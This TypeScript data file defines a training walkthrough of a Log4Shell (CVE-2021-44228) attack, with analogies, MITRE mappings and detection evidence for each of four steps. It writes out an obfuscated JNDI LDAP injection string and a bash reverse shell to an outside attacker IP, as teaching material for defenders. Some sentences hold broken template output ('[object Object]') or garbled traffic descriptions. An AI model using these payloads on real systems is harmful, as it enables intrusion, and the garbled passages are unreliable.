import type { RawScenarioStepGuideData } from '@/modules/scenarios/contracts';

export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'log4shell-dfir',
    briefing: {
      headline: 'Scenario Briefing: Log4Shell (CVE-2021-44228), From a Single HTTP Log Line to Remote Code Execution',
      storyAnalogy:
        'Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building.',
      plainSummary:
        'In this scenario (CVE-2021-44228, Log4Shell JNDI Injection to Reverse Shell) at 10.20.1, the attacker plants a malicious lookup string so a helpful logger dials out and loads remote code instead of writing plain text. The attack unfolds in one continuous arc: hide a JNDI LDAP lure inside an HTTP header (so the guestbook dials an outside bureau), force Log4j to evaluate that lookup (so the app asks the attacker what to build), follow the LDAP referral to download bytecode (so unsigned instructions enter the JVM), then run the static initializer into a reverse shell (handing the line to the caller). Steps #1–#4 walk that chain end-to-end by covering the poisoned header, outbound LDAP call, remote class load, and shell spawn, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible. Primary detection pivots on Suricata and nginx access-log telemetry across the kill chain.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Attacker Exploit & Scanner 91.214.124.88), follow Step #1 (#1→) through Node ② (Nginx Reverse Proxy 10.20.1.10:443), trace Step #2 (#2→) as Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) queries Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), watch Step #3 (#3→) fetch Exploit.class into Node ④ (java PID 1420 → /bin/sh PID 8912), and follow Step #4 (#4→) spawning the reverse shell to Node ① (91.214.124.88:4444) monitored by Node ⑥ (SOC SIEM & Linux Auditd).',
      documentedAdvisory: 'CISA Alert AA21-356A · NIST NVD CVE-2021-44228 · MITRE ATT&CK T1190 / T1059.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Sending the "${jndi:ldap://...}" String Inside an HTTP Header & Triggering Logger Evaluation',
        storyAnalogy:
          'The intruder walks up to the front reception desk and hands over a visitor badge whose "X-Api-Version / User-Agent" field contains a secret phone-call instruction instead of a normal browser name.',
        simpleExplanation:
          'The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401).',
        howItWorksInPractice:
          'Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression.',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ① (Attacker Exploit & Scanner 91.214.124.88) to Node ② (Nginx Reverse Proxy 10.20.1.10:443), forwarding GET /api/v1/login into the Java application and returning HTTP 401.',
        detectionAndEvidence:
          'Documented in CISA AA21-356A & Nginx Access Log (/var/log/nginx/access.log) / ModSecurity CRS Rule 944150: GET /api/v1/login returning HTTP 401 with User-Agent containing "${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit}". Correlate Sysmon or Windows Security Event telemetry for T1190 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1203',
        plainTitle: 'Log4j Evaluates the Lookup & Connects Out to the Attacker’s Rogue LDAP Server',
        storyAnalogy:
          'As the receptionist writes the visitor’s header into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (91.214.124.88:1389) to ask what to do next.',
        simpleExplanation:
          'Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object).',
        howItWorksInPractice:
          'JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING).',
        diagramAlignment:
          'On the diagram, follow Step #2 / Link #2 (#2→ / ⇠#2) from Node ③ (Spring Boot App Server app-prod-01 10.20.1.15) out to Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:1389), returning the LDAP SearchResultEntry referral.',
        detectionAndEvidence:
          'Documented in Suricata IDS (ET EXPLOIT Apache Log4j RCE Outbound LDAP) & Zeek: internal Java server 10.20.1.15:49210 initiating unexpected outbound TCP/1389 LDAP SearchRequest (118 B) to 91.214.124.88:1389.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1105',
        plainTitle: 'LDAP Referral & Downloading Remote "Exploit.class" Bytecode Over HTTP',
        storyAnalogy:
          'The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (javaCodeBase)." The Java server obediently fetches that blueprint and loads it directly into memory.',
        simpleExplanation:
          'The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory).',
        howItWorksInPractice:
          'When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) delivers GET /Exploit.class (HTTP 200 OK · 1.8 KB Java Bytecode) from Node ⑤ (Rogue LDAP & HTTP Stage 91.214.124.88:8888) into Node ④ (java PID 1420 → /bin/sh PID 8912).',
        detectionAndEvidence:
          'Documented in Zeek http.log & Suricata: Java process (10.20.1.15) receiving HTTP 200 OK (1,842 bytes, application/java-vm, CAFEBABE magic header) from http://91.214.124.88:8888/Exploit.class.',
      },
      {
        stepNumber: 4,
        mitreId: 'T1059.004',
        plainTitle: 'Executing the Static Initializer & Spawning a "/bin/sh" Reverse Shell',
        storyAnalogy:
          'The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (static {} block) snaps open and dials a permanent private backdoor phone line (/bin/sh) straight back to the intruder on port 4444.',
        simpleExplanation:
          'The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user).',
        howItWorksInPractice:
          'By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, Step #4 / Link #4 (#4→ / ⇠#4) spawns /bin/sh (PID 8912) inside Node ④ (java PID 1420 → /bin/sh) and connects out to Node ① (91.214.124.88:4444), while Node ⑥ (SOC SIEM & Linux Auditd) logs SYSCALL execve (PID 8912).',
        detectionAndEvidence:
          'Documented in Linux Auditd (SYSCALL 59 execve, pid=8912, ppid=1420, uid=1001 tomcat) & Sigma rule: /usr/bin/java spawning /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1".',
      },
    ],
  };
